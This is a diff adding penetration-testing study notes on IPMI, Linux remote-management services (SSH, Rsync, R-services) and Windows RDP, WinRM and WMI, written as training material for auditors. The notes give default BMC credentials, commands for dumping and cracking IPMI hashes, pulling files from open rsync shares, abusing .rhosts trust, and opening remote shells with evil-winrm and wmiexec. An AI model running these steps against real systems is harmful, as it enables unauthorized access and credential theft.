@@ -1720,3 +1720,331 @@ Verify the successful upload via a standard HTTP GET request:
 ```bash
 curl -X GET [http://10.129.204.235/testing.txt](http://10.129.204.235/testing.txt)
 ```
+
+# Intelligent Platform Management Interface (IPMI): Protocol Analysis and Security Auditing
+
+## 1. Executive Summary
+The Intelligent Platform Management Interface (IPMI) is a standardized specification designed for hardware-level system management and monitoring. Functioning as an autonomous out-of-band (OOB) subsystem, IPMI operates independently of the host's BIOS, CPU, firmware, and underlying operating system. This provides System Administrators with the capability to manage, monitor, and recover systems even during unresponsive states or when powered off.
+
+Primary administrative use cases include:
+* Modifying BIOS settings prior to OS boot sequences.
+* Managing fully powered-down hosts.
+* Remote recovery and troubleshooting post-system failures.
+* Out-of-band environmental monitoring (temperature, voltage, fan speeds).
+* Remote firmware upgrades and inventory querying via SNMP alerting.
+
+## 2. Core Architecture and Components
+IPMI, initially introduced by Intel in 1998, is currently supported by over 200 vendors (e.g., HP iLO, Dell iDRAC, Supermicro). Systems running IPMI version 2.0 support Serial over LAN (SoL), granting in-band serial console output. The architecture relies on several critical components:
+
+* **Baseboard Management Controller (BMC):** A specialized micro-controller acting as the intelligence behind IPMI. Often deployed as an embedded ARM system running Linux, it is integrated into the motherboard or added via a PCI expansion card. Gaining access to the BMC effectively equates to physical access to the server.
+* **Intelligent Chassis Management Bus (ICMB):** An interface facilitating inter-chassis communication.
+* **Intelligent Platform Management Bus (IPMB):** The internal communications bus extending the BMC's reach to other hardware components.
+* **IPMI Memory:** Non-volatile storage containing the System Event Log (SEL), Sensor Data Records (SDR), and repository data.
+* **Communications Interfaces:** The standardized interfaces for local/serial access and Remote Management Control Protocol (RMCP) via LAN.
+
+## 3. Reconnaissance and Footprinting
+IPMI communicates remotely over UDP port 623 via the RMCP. During internal penetration tests, identifying BMCs is critical, as compromise allows unauthorized power cycling, OS reinstallation, and full system takeover.
+
+### 3.1. Nmap Service Enumeration
+Utilizing the `ipmi-version` NSE script enables the identification of the protocol version, authentication mechanisms, and vendor details (derived from the MAC address).
+
+    sudo nmap -sU --script ipmi-version -p 623 <target_ip>
+
+    # Example Output:
+    PORT    STATE SERVICE
+    623/udp open  asf-rmcp
+    | ipmi-version:
+    |   Version:
+    |     IPMI-2.0
+    |   UserAuth:
+    |   PassAuth: auth_user, non_null_user
+    |_  Level: 2.0
+    MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)
+
+### 3.2. Metasploit Version Discovery
+The Metasploit Framework offers auxiliary modules to scan subnets efficiently and enumerate IPMI-enabled hosts.
+
+    use auxiliary/scanner/ipmi/ipmi_version
+    set RHOSTS <target_subnet>
+    run
+
+## 4. Default Credentials Assessment
+Administrators frequently deploy BMCs without altering factory default configurations. Testing standard credentials is a high-priority operational step during the enumeration phase.
+
+| Vendor / Product | Default Username | Default Password |
+| :--- | :--- | :--- |
+| **Dell iDRAC** | `root` | `calvin` |
+| **HP iLO** | `Administrator` | Randomized 8-character string (A-Z, 0-9) |
+| **Supermicro IPMI** | `ADMIN` | `ADMIN` |
+
+*Note: Successful authentication provides direct access to the web-based management console, as well as SSH or Telnet command-line interfaces.*
+
+## 5. Vulnerability Analysis: IPMI 2.0 RAKP Hash Disclosure
+When default credentials are not viable, auditors can exploit a foundational cryptographic flaw within the IPMI 2.0 RMCP+ Authenticated Key-Exchange Protocol (RAKP).
+
+### 5.1. The RAKP Flaw
+During the authentication handshake, the BMC server transmits a salted SHA1 or MD5 hash of the requested user's password to the client *before* validating the client's identity. This architectural vulnerability permits an unauthenticated attacker to request the password hash for any valid BMC user account. 
+
+### 5.2. Hash Extraction via Metasploit
+The `ipmi_dumphashes` module automates the extraction process and attempts immediate cracking against common password wordlists.
+
+    use auxiliary/scanner/ipmi/ipmi_dumphashes
+    set RHOSTS <target_ip>
+    set USER_FILE /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt
+    set PASS_FILE /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt
+    run
+
+    # Example Extraction Output:
+    [+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d480204...
+    [+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
+
+### 5.3. Offline Password Cracking
+Extracted hashes can be cracked offline utilizing Hashcat (Mode 7300). For instance, when targeting the factory default 8-character HP iLO passwords, an alphanumeric mask attack is highly effective:
+
+    hashcat -m 7300 ipmi_hashes.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
+
+### 5.4. Post-Exploitation Impact and Remediation
+There is no definitive patch for this vulnerability, as it is a core feature of the IPMI 2.0 specification. The standard remediation involves deploying strong, complex passwords exceeding 16 characters and strictly isolating the IPMI management interfaces onto dedicated network segments (VLANs) with rigorous ACLs. 
+
+For a penetration tester, compromising a BMC often yields lateral movement opportunities. It is common to discover that a crackable IPMI password has been aggressively reused by administrators across other critical infrastructure components, granting unauthorized root access to internal servers and network monitoring tools.
+
+# Linux Remote Management Protocols: Security & Auditing Guide
+
+## Introduction to Remote Systems Management
+In enterprise Linux environments, remote management protocols are essential for infrastructure administration, enabling SysAdmins and engineers to troubleshoot and maintain distributed servers efficiently without physical access. Due to their ubiquity and high-privilege nature, these services present a high-value attack surface during penetration testing engagements. Misconfigurations in these daemons often lead to unauthorized access or privilege escalation. Understanding the underlying architecture, default configurations, and auditing methodologies for these protocols is a critical competency for systems administrators and cybersecurity professionals.
+
+---
+
+## 1. Secure Shell (SSH)
+Secure Shell (SSH) is the industry standard for encrypted remote administration. Operating over standard port TCP 22, it establishes a secure tunnel between two endpoints, mitigating Man-In-The-Middle (MITM) attacks and packet sniffing. The prevalent open-source implementation across Linux and macOS environments is OpenSSH. 
+
+While SSH-1 is deprecated due to inherent cryptographic vulnerabilities (such as susceptibility to MITM attacks), SSH-2 remains the modern standard, offering robust encryption, improved integrity checks, and enhanced connection stability.
+
+### Authentication Mechanisms
+OpenSSH supports multiple authentication mechanisms, including Password, Public-Key, Host-based, Keyboard-interactive, Challenge-Response, and GSSAPI.
+
+**Public Key Authentication (Asymmetric Cryptography)**
+Public-key authentication relies on a cryptographic key pair to securely authenticate users without transmitting passwords over the network:
+1. **Initial Handshake:** The server transmits its public host key to the client. The client verifies this against a list of known hosts to prevent MITM interception.
+2. **Challenge-Response:** The server generates a cryptographic challenge using the client's public key (stored in `~/.ssh/authorized_keys` on the server).
+3. **Decryption & Validation:** The client decrypts the challenge utilizing its private key (secured locally via a passphrase) and returns the solution, successfully authenticating the session.
+
+### Configuration Auditing & Dangerous Settings
+The primary configuration file for the OpenSSH daemon is located at `/etc/ssh/sshd_config`. Default installations generally require manual hardening. 
+
+    cat /etc/ssh/sshd_config | grep -v "#" | sed -r '/^\s*$/d'
+
+During a security assessment, auditors should look for the following misconfigurations that drastically increase the risk of compromise:
+
+* `PasswordAuthentication yes`: Permits password brute-forcing attacks against known user accounts.
+* `PermitEmptyPasswords yes`: Allows logins for accounts with null passwords.
+* `PermitRootLogin yes`: Enables direct root access, bypassing the need for privilege escalation.
+* `Protocol 1`: Forces the use of legacy, vulnerable encryption standards.
+* `X11Forwarding yes`: Allows GUI application forwarding (notably vulnerable in OpenSSH 7.2p1 via command injection - CVE-2016-3115).
+* `AllowTcpForwarding yes` / `PermitTunnel yes`: Facilitates port forwarding and tunneling, allowing attackers to pivot through the network.
+
+### Service Footprinting and Enumeration
+Detailed enumeration of the SSH service can reveal supported algorithms, potential CVEs, and authentication methods. The `ssh-audit` tool is highly effective for fingerprinting client and server configurations.
+
+    git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit
+    ./ssh-audit.py <TARGET_IP>
+
+To determine which authentication methods the server accepts, penetration testers can initiate a verbose SSH connection:
+
+    ssh -v user@<TARGET_IP>
+
+If brute-forcing is authorized within the scope of the engagement, the client can be forced to use password-based authentication:
+
+    ssh -v user@<TARGET_IP> -o PreferredAuthentications=password
+
+---
+
+## 2. Rsync Service
+Rsync is a highly efficient file synchronization utility utilized for local and remote backups. It relies on a delta-transfer algorithm, transmitting only the modified portions of files, which drastically reduces bandwidth consumption. 
+
+By default, the Rsync daemon listens on port TCP 873 in plaintext, though it is frequently configured to tunnel through SSH for secure data transmission.
+
+### Scanning and Enumeration
+Identify active Rsync services using Nmap service detection:
+
+    sudo nmap -sV -p 873 <TARGET_IP>
+
+Once identified, raw socket connections via Netcat can reveal available modules (shares):
+
+    nc -nv <TARGET_IP> 873
+    #list
+    @RSYNCD: EXIT
+
+### Exploiting Open Shares
+If a share allows anonymous access (e.g., a module named `dev`), attackers can list its contents and exfiltrate sensitive data, such as source code, configuration files, or `.ssh` directories containing private keys.
+
+    rsync -av --list-only rsync://<TARGET_IP>/dev
+
+To synchronize and pull the files to the local attack infrastructure:
+
+    rsync -av rsync://<TARGET_IP>/dev ./local_loot_folder/
+
+*(Note: If the target utilizes Rsync over SSH, append the `-e ssh` parameter to the command).*
+
+---
+
+## 3. Legacy R-Services
+Originally developed by the UC Berkeley CSRG, R-Services (Remote Services) represent a suite of legacy Unix utilities designed for remote execution and file transfer. Operating over TCP ports 512, 513, and 514, these protocols transmit data—including credentials—in cleartext, making them highly susceptible to network sniffing and MITM attacks. SSH has largely deprecated R-Services in modern environments.
+
+**Core R-Commands Suite:**
+* `rcp` (TCP 514): Remote copy (bidirectional file transfer).
+* `rsh` (TCP 514): Remote shell execution without standard login procedures.
+* `rexec` (TCP 512): Remote command execution (requires plaintext authentication unless overridden by trust files).
+* `rlogin` (TCP 513): Remote interactive login session.
+* `rwho` / `rusers`: Enumeration of currently authenticated users on the network.
+
+### Access Control and Trusted Relationships
+R-Services handle access control via Pluggable Authentication Modules (PAM), but they natively support authentication bypass through **trusted relationships**. These relationships are defined in two primary files:
+* `/etc/hosts.equiv`: Global system-wide configuration.
+* `~/.rhosts`: Per-user configuration.
+
+Entries follow a `<hostname> <username>` syntax. A severe misconfiguration occurs when the `+` wildcard is implemented, granting unrestricted access. 
+
+    cat .rhosts
+    + +
+
+### Exploitation and Post-Exploitation Enumeration
+If an auditor discovers an exposed `.rhosts` file configured with excessive trust, they can establish a remote shell without supplying credentials:
+
+    rlogin <TARGET_IP> -l <TARGET_USER>
+
+Upon successful compromise, the attacker can leverage native tools to map the internal network and identify other active sessions, paving the way for lateral movement:
+
+    rwho
+    rusers -al <TARGET_IP>
+
+### Conclusion
+Remote management services, while indispensable for IT operations, often serve as primary initial access vectors during security assessments. Auditing these protocols requires rigorous footprinting, an understanding of default configurations, and meticulous evaluation of access control mechanisms to prevent unauthorized network compromise.
+
+# Windows Remote Management Protocols: Administration & Enumeration
+
+Windows Server environments leverage a robust set of built-in features to facilitate local and remote hardware and service management. Starting with Windows Server 2016, remote management is enabled by default, functioning as a core component of the Windows hardware management framework. These capabilities rely on services that implement the WS-Management (WSMan) protocol, baseboard management controllers (BMCs) for hardware diagnostics, and COM APIs paired with scripting objects for advanced remote application communication.
+
+The primary protocols utilized for the remote administration of Windows environments include:
+*   **Remote Desktop Protocol (RDP)**
+*   **Windows Remote Management (WinRM)**
+*   **Windows Management Instrumentation (WMI)**
+
+Understanding the architecture, default configurations, and footprinting techniques for these protocols is critical for both Systems Administrators and Cybersecurity Auditors.
+
+---
+
+## 1. Remote Desktop Protocol (RDP)
+
+Developed by Microsoft, the Remote Desktop Protocol (RDP) provides graphical interface access over a network connection. Operating at the application layer of the TCP/IP suite, RDP traditionally listens on **TCP port 3389**, although it can also utilize connectionless UDP on the same port for specific administrative tasks.
+
+For a successful RDP session, comprehensive network routing is required. Both perimeter and host-based firewalls must permit inbound connections. In topologies utilizing Network Address Translation (NAT)—common in external Internet connections—port forwarding rules must be explicitly defined to route traffic to the target server's private IP.
+
+### Encryption and Authentication
+Since the release of Windows Vista, RDP has supported **Transport Layer Security (TLS/SSL)**, ensuring that the authentication process and data streams are robustly encrypted. However, legacy configurations often fallback to standard RDP Security, which provides inadequate encryption. 
+
+A prevalent issue in corporate environments is the reliance on self-signed certificates for RDP services. This prevents clients from verifying the server's identity, resulting in security warnings and exposing the connection to potential Man-In-The-Middle (MITM) attacks. Modern Windows Servers mitigate unauthorized access attempts by enforcing **Network Level Authentication (NLA)** by default, requiring users to authenticate before a full session is established.
+
+### Footprinting and Service Enumeration
+
+Scanning the RDP service yields critical intelligence, including OS build versions, hostnames, and NLA enforcement status. 
+
+    $ nmap -sV -sC 10.129.201.248 -p3389 --script rdp*
+    
+    Starting Nmap 7.92 ( https://nmap.org )
+    Nmap scan report for 10.129.201.248
+    Host is up (0.036s latency).
+    
+    PORT     STATE SERVICE       VERSION
+    3389/tcp open  ms-wbt-server Microsoft Terminal Services
+    | rdp-enum-encryption: 
+    |   Security layer
+    |     CredSSP (NLA): SUCCESS
+    |     CredSSP with Early User Auth: SUCCESS
+    |_    RDSTLS: SUCCESS
+    | rdp-ntlm-info: 
+    |   Target_Name: ILF-SQL-01
+    |   NetBIOS_Domain_Name: ILF-SQL-01
+    |   Product_Version: 10.0.17763
+    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+By appending the `--packet-trace` flag to Nmap, penetration testers can perform deep packet inspection. Note that RDP cookies (e.g., `mstshash=nmap`) transmitted during these scans are highly recognizable signatures. Modern Endpoint Detection and Response (EDR) solutions and threat hunters actively monitor for these artifacts to block reconnaissance attempts in hardened networks.
+
+### RDP Security Assessment
+
+To evaluate RDP security settings without authenticating, security researchers often utilize specialized tools such as `rdp-sec-check.pl` (developed by Cisco CX Security Labs). This Perl script analyzes handshake processes to determine supported encryption layers and protocol vulnerabilities.
+
+    $ git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git
+    $ cd rdp-sec-check
+    $ ./rdp-sec-check.pl 10.129.201.248
+    
+    [+] Summary of protocol support
+    [-] 10.129.201.248:3389 supports PROTOCOL_SSL   : FALSE
+    [-] 10.129.201.248:3389 supports PROTOCOL_HYBRID: TRUE
+    [-] 10.129.201.248:3389 supports PROTOCOL_RDP   : FALSE
+
+### Client Connection
+
+For remote interaction from Linux-based penetration testing environments (like Kali Linux), `xfreerdp` is the standard client. It allows seamless credential pass-through and certificate acceptance.
+
+    $ xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248
+
+---
+
+## 2. Windows Remote Management (WinRM)
+
+Windows Remote Management (WinRM) is a robust, command-line-driven remote management protocol deeply integrated into the Windows OS. It utilizes the **Simple Object Access Protocol (SOAP)** to interact with remote hosts.
+
+Historically operating over ports 80 and 443, modern WinRM implementations use dedicated ports to avoid conflicts with standard web traffic:
+*   **TCP 5985** (HTTP)
+*   **TCP 5986** (HTTPS)
+
+WinRM is a prerequisite for advanced administrative functions, including PowerShell Remoting and event log forwarding. While enabled by default on Windows Server 2012 and later, it requires explicit configuration on Windows 10/11 client machines and legacy servers. A complementary component, Windows Remote Shell (WinRS), allows administrators to execute arbitrary commands remotely on configured hosts.
+
+### Footprinting and Service Enumeration
+
+During reconnaissance, it is common to discover WinRM utilizing the unencrypted HTTP port (5985) rather than the secure HTTPS counterpart.
+
+    $ nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n
+    
+    PORT     STATE SERVICE VERSION
+    5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+    |_http-title: Not Found
+    |_http-server-header: Microsoft-HTTPAPI/2.0
+    Service Info: OS: Windows
+
+From an offensive standpoint, `evil-winrm` is an essential Ruby-based tool for establishing interactive PowerShell sessions over WinRM using compromised credentials or Pass-The-Hash (PtH) techniques. From a SysAdmin perspective, PowerShell's native `Test-WsMan` cmdlet is the standard method for verifying WinRM connectivity.
+
+    $ evil-winrm -i 10.129.201.248 -u Cry0l1t3 -p 'P455w0rD!'
+    
+    Evil-WinRM shell v3.3
+    Info: Establishing connection to remote endpoint
+    *Evil-WinRM* PS C:\Users\Cry0l1t3\Documents>
+
+---
+
+## 3. Windows Management Instrumentation (WMI)
+
+Windows Management Instrumentation (WMI) is Microsoft's implementation of the Common Information Model (CIM) and the Web-Based Enterprise Management (WBEM) standard. It is arguably the most powerful administrative interface in the Windows ecosystem, granting profound read and write access to nearly all system configurations.
+
+Administrators typically interface with WMI repositories via PowerShell, VBScript, or the deprecated Windows Management Instrumentation Console (WMIC).
+
+### Footprinting and Service Enumeration
+
+Unlike statically ported services, WMI operates dynamically. The initial communication handshake always occurs over the **RPC Endpoint Mapper on TCP port 135**. Upon successful negotiation, the session is seamlessly handed off to a randomly assigned high TCP port (typically in the 49152-65535 range).
+
+In penetration testing operations, tools like `wmiexec.py` from the Impacket toolkit are highly favored. They provide semi-interactive shell access by leveraging WMI, offering a stealthier alternative to tools like PsExec by avoiding the instantiation of custom service binaries on the target.
+
+    $ /usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"
+    
+    Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+    [*] SMBv3.0 dialect used
+    ILF-SQL-01
+
+---
+
+## 4. Conclusion and Best Practices
+
+While theoretical documentation is invaluable, proficiency in managing and auditing these protocols requires practical application. It is highly recommended to deploy custom Windows Server instances within a localized Homelab environment (e.g., using Proxmox or VirtualBox). 
+
+By actively configuring RDP encryption layers, enforcing WinRM over HTTPS, and auditing WMI event subscriptions, administrators can gain a definitive understanding of both operational deployments and defensive hardening strategies against lateral movement techniques.
